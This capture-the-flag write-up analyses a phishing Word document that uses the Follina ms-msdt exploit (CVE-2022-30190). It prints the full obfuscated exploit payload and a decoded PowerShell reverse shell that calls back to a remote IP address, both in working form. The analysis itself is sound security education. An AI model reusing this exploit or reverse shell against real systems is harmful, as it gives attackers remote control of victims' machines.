# Phishing
## *Challenge Description:*
- [Attachement](./Attachements/attachment.docx)
## *Solution:*
1. General analysis: Checking the file
```
file attachment.docx
    attachment.docx: Microsoft Word 2007+
```
DOCX files are archives of files that include XML documents. 
```
unzip attachment.docx 
    Archive:  attachment.docx
      inflating: [Content_Types].xml     
      inflating: word/styles.xml         
      inflating: word/webSettings.xml    
      inflating: word/document.xml       
      inflating: word/settings.xml       
      inflating: word/fontTable.xml      
      inflating: word/theme/theme1.xml   
      inflating: word/_rels/document.xml.rels  
      inflating: docProps/app.xml        
      inflating: docProps/core.xml       
      inflating: _rels/.rels  
```

2. Content analysis: The document seems to be empty. Checking document.xml reveals
```
cat word/document.xml
        ...
        <o:OLEObject Type="Link" ProgID="htmlfile" ShapeID="_x0000_i1025" DrawAspect="Content" r:id="rId996" UpdateMode="OnCall">
        <o:LinkType>EnhancedMetaFile</o:LinkType><o:LockedField>false</o:LockedField><o:FieldCodes>\f 0</o:FieldCodes></o:OLEObject>
        ...
```

3. Checking OLEobjects and VBA macros, document.xml.rels seems interesting.
```
olevba --decode word/_rels/document.xml.rels
        ...
        <Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://134.122.84.204/rtf-word-template.html" TargetMode="External"/>
        ...
        +----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://134.122.84.20|URL                                          |
|          |4/rtf-word-         |                                             |
|          |template.html       |                                             |
|IOC       |134.122.84.204      |IPv4 address                                 |

```

4.  
```
wget "http://134.122.84.204/rtf-word-template.html
```
Looking at the file will show a scrit:
```
<script> location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'Jihbc2NyaXB0YmxvY2tdOjpjcmVhdGUoKE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihOZXctT2JqZWN0IFN5c3RlbS5JTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKChOZXctT2JqZWN0IFN5c3RlbS5JTy5NZW1vcnlTdHJlYW0oLFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKCgnSDRzSUFBOWlTR017MH1BNVZWVFcvak5oezB9OSsxY01ETFdSRUp0UXZEbTBBYktvcTgwV0FiSzd4aXB0RG9hQjBOUTRWa09UTGtuRk5oTC85NUlTOWVFNFFiczYyQkpuK1BqNDV7MX0yNUtBUXp1UlR3QjVyaEhjNFp6MUVZNkQzM3dEN0Joc0VsZk1YTjhOdjhiMlFHaHJlN05YNmxLN1NEaHRqOHBNeXZrOG1mR2ovaHsxfWhiY0onKydBb3pHOGtwMXhZaU1LckFKbXVpNUhaSFhtWFk4YzVJbmR2Yjl4WTF4Ylhjb0xKZmxoMlU4UWxWZEJWVzc5UFVxRnc4ekknKydKRXJsWlVaSVBEMFZSekpzV3J3VTl5STdpa1dUa2FlVXdsR1dvTlhvezB9VnpBcU9qdUJ2WVFSVlNyNkFzRjRHaHZ7MX1QOU9lNXlQcFJHYXptbFhONXJ7MX0wS1ZIYnlOTjNaOXhWeHFxV1NQYUxSNUphdGIzekc3TmM0L25BOGtXaERsWEhyK3BYTHF7MH0vUlpTZHZ6Qml1alFXJysnc3loRldWUGJ2MFZYNGhFcmpNZU1HdWxQeXQ1ezF9bkU3OVEvK3pET1RrYmpjezF9djUyUVVuL2NIYmlOKzlWNmxvRFlLNmNyUnJkezB9SmRWcGFqbG1hTGNHcVFCVS9aNWErcjBlSG5kWThyY0hlSVlpc1VMblprYlJPRGYzNnsxfTJCaFhZVycrJ0Q4RG00dGVoN0dGSU4wNE01MzNFbERTYW9UTDdJR1RYNEYrVjVScDMxRXNyNW5MTEhXUlM5UVllTXswfTdOMHZuV1R4dm85YVFKUmNEN29HNjdQUm4zUHB3dlg2TlR1c3l2a2RMNHpPSjNOQXZmdkRCa1RpMnVmbDUrZTQ3M1hHa1ZXaDhPcHdhMGhLSmpNbk5zdkxzWnBjbjBkT2YxL2R6bGgvODdhVm00MFRGeGpwVXZrJysnSEZRaGhNMEdxMDZoclhYN2NBb0JpcWNMOXlWYzQ1L2FNVnVvSnNEa2FsMllOJysnbnsxfXZFcm5lcWZ4aGFTQk1JdmknKydTTXlXMVhCaElwRnBMVlFwS1lPd1djMGthRkZyc0o4ekknKyd2YnsxfVgzcFJlRG5KblM0Tmh1N0ZCUEd7MX0veUEyS0I3UHMyJysncWh1NmE2UmpuejBZeXBOVDJkd1l5R2RMUDQ0SUEzUEgrZGF6L29zMVJWbFM4dTVBb1ZjTk1kTm05WFNkazk0Y0VwSHBONXRkYURWU05ITHRYaVNqemk4MnE2dHR0cnEzYURzdTViYUxIT09ZUmprcGV1cVRYeEhtb1dWeHdZUUR5QTRZQi9CVXswfURFUjVKZU9mMHd1N1Zhdm5kaCtEWjFLYVRVK01wcjNxTFlacU9PU3sxfWZObnhibDdtcFJJY2knKydqVjlXMHZlbUtlYlJ2R05ZSFh3VSsrdmp6R2J6QXQ4SU1LMVR3NWptQUdrRXBTQTE4ezB9aWVURkU3c2Y2bi9qV1NsaHlNeW9XYnBvJysnaC8nKydocEFYWk9pJysnSUJLaVhWTko0ZExOWmhYY1lKNDBoVkdMM0Y0TEw3WVZ0dDJ6czI4UC95Ynd2em40N3RHdmJJci9XY3o3elF5K1l1OUFlUFA5b1RMalg2L1pUdFdOOVFYY08wMTFacTVMcStxL3l2ZFdaenpUZTE4L2ZWdjhMdUwreXN7MH1BQUEnKS1mJ0MnLCdnJykpKSksW1N5c3RlbS5JTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKSkpLlJlYWRUb0VuZCgpKSk='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";//AAAAAAAAAAAA... </script>
```
And it's a Deja-Vu, [CVE-2022-30190 Explained](https://ethical.blue/textz/n/32). There must be a RCE, but what code?
```
&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAA9iSGM{0}A5VVTW/jNh{0}9+1cMDLWREJtQvDm0AbKoq80WAbK7xiptDoaB0NQ4VkOTLknFNhL/95IS9eE4Qbs62BJn+Pj45{1}25KAQzuRTwB5rhHc4Zz1EY6D33wD7BhsElfMXN8Nv8b2QGhre7NX6lK7SDhtj8pMyvk8mfGj/h{1}hbcJ'+'AozG8kp1xYiMKrAJmui5HZHXmXY8c5Indvb9xY1xbXcoLJflh2U8QlVdBVW79PUqFw8zI'+'JErlZUZIPD0VRzJsWrwU9yI7ikWTkaeUwlGWoNXo{0}VzAqOjuBvYQRVSr6AsF4Ghv{1}P9Oe5yPpRGazmlXN5r{1}0KVHbyNN3Z9xVxqqWSPaLR5Jatb3zG7Nc4/nA8kWhDlXHr+pXLq{0}/RZSdvzBiujQW'+'syhFWVPbv0VX4hErjMeMGulPyt5{1}nE79Q/+zDOTkbjc{1}v52QUn/cHbiN+9V6loDYK6crRrd{0}JdVpajlmaLcGqQBU/Z5a+r0eHndY8rcHeIYisULnZkbRODf36{1}2BhXYW'+'D8Dm4teh7GFIN04M533ElDSaoTL7IGTX4F+V5Rp31Esr5nLLHWRS9QYeM{0}7N0vnWTxvo9aQJRcD7oG67PRn3PpwvX6NTusyvkdL4zOJ3NAvfvDBkTi2ufl5+e473XGkVWh8Opwa0hKJjMnNsvLsZpcn0dOf1/dzlh/87aVm40TFxjpUvk'+'HFQhhM0Gq06hrXX7cAoBiqcL9yVc45/aMVuoJsDkal2YN'+'n{1}vErneqfxhaSBMIvi'+'SMyW1XBhIpFpLVQpKYOwWc0kaFFrsJ8zI'+'vb{1}X3pReDnJnS4Nhu7FBPG{1}/yA2KB7Ps2'+'qhu6a6Rjnz0YypNT2dwYyGdLP44IA3PH+daz/os1RVlS8u5AoVcNMdNm9XSdk94cEpHpN5tdaDVSNHLtXiSjzi82q6tttrq3aDsu5baLHOOYRjkpeuqTXxHmoWVxwYQDyA4YB/BU{0}DER5JeOf0wu7Vavndh+DZ1KaTU+Mpr3qLYZqOOS{1}fNnxbl7mpRIci'+'jV9W0vemKebRvGNYHXwU++vjzGbzAt8IMK1Tw5jmAGkEpSA18{0}ieTFE7sf6n/jWSlhyMyoWbpo'+'h/'+'hpAXZOi'+'IBKiXVNJ4dLNZhXcYJ40hVGL3F4LL7YVtt2zs28P/ybwvzn47tGvbIr/Wcz7zQy+Yu9AePP9oTLjX6/ZTtWN9QXcO011Zq5Lq+q/yvdWZzzTe18/fVv8LuL+ys{0}AAA')-f'C','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
```
1. The {base64payload} needs some work: concatenation, replace("{0}","C"), replace("{1}","g"), base64 decode then gunzip it. The result:
```
function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]9003
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("134.122.84.204",9003)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("134.122.84.204",$null,"tls12",$false)
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    if ($listener)
    {
    $listener.Stop()
    }
    }
}

powerfun -Command reverse
```
6.  The script connects to 134.122.84.204:9003, we give it a visit:
```
$super_secret = 'IngeHack{N3ver_0p3n_5us_VV0rD_d0Cs_k1dd0}'
whoami
msg $env:username I AM STRONG I AM SMARTER I AM BETTER
```

## *Flag:*
IngeHack{N3ver_0p3n_5us_VV0rD_d0Cs_k1dd0}







